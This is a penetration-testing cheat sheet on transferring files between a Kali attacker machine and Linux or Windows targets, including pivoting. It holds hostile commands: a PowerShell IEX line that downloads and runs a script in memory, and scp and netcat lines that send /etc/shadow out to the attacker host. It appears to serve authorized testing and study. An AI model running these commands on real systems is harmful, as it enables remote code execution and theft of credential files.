# File Transfers

## Kali → Linux

```bash
# Python HTTP server (on Kali) + wget/curl (on target)
python3 -m http.server 80
wget http://KALI/file                       # on target
curl http://KALI/file -o file               # on target

# SCP
scp file user@TARGET:/tmp/

# Netcat
nc -lvnp 9999 > file                       # receiver
nc TARGET 9999 < file                       # sender

# Base64 (through a limited shell)
base64 -w 0 file                            # on Kali (copy output)
echo "BASE64" | base64 -d > file            # on target (paste)
```

## Kali → Windows

```bash
# SMB share (best — no tools needed on target)
impacket-smbserver share . -smb2support
copy \\KALI\share\file C:\temp\             # on Windows

# certutil
certutil -urlcache -f http://KALI/file C:\temp\file

# PowerShell
iwr http://KALI/file -o C:\temp\file
IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')    # download + execute in memory

# Bitsadmin
bitsadmin /transfer job /download /priority high http://KALI/file C:\temp\file
```

## Target → Kali (exfiltration)

```bash
# Linux → Kali
scp /etc/shadow kali@KALI:/tmp/loot/
nc KALI 9999 < /etc/shadow

# Windows → Kali (SMB)
impacket-smbserver share /tmp/loot -smb2support    # on Kali
copy C:\file \\KALI\share\                          # on Windows
```

## Through Pivots (internal target can't reach Kali)

```bash
# Option 1: SCP chain
scp file user@PIVOT:/tmp/ && ssh user@PIVOT "scp /tmp/file user@INTERNAL:/tmp/"

# Option 2: HTTP server on the pivot
ssh user@PIVOT "cd /tmp && python3 -m http.server 8080"
# On internal: wget http://PIVOT_INTERNAL_IP:8080/file

# Option 3: SSH reverse forward for file serving
ssh -R 8080:127.0.0.1:80 user@PIVOT
# Internal target: wget http://PIVOT_INTERNAL_IP:8080/file
```

## Verify Transfers

```bash
md5sum file     # compare on both sides — must match
```
